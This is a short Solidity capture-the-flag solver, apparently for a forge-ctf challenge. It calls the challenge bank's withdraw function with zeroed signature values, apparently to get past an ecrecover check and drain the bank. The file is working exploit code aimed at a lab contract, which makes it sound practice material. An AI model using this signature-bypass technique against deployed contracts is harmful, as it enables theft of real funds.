// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-ctf/CTFSolver.sol";

import "src/Challenge.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external payable {
        console.log("solved?", CHALLENGE.isSolved());

        CHALLENGE.BANK().withdraw{value: msg.value}(
            0x0000000000000000000000000000000000000000000000000000000000000000,
            27,
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x0000000000000000000000000000000000000000000000000000000000000000
        );

        console.log("solved?", CHALLENGE.isSolved());
    }

    fallback() external payable {
        require(msg.value >= 1 ether);
    }
}

contract Solve is CTFSolver {
    function solve(address challenge, address) internal override {
        new Exploit(Challenge(challenge)).exploit{value: 9 wei}();
    }
}
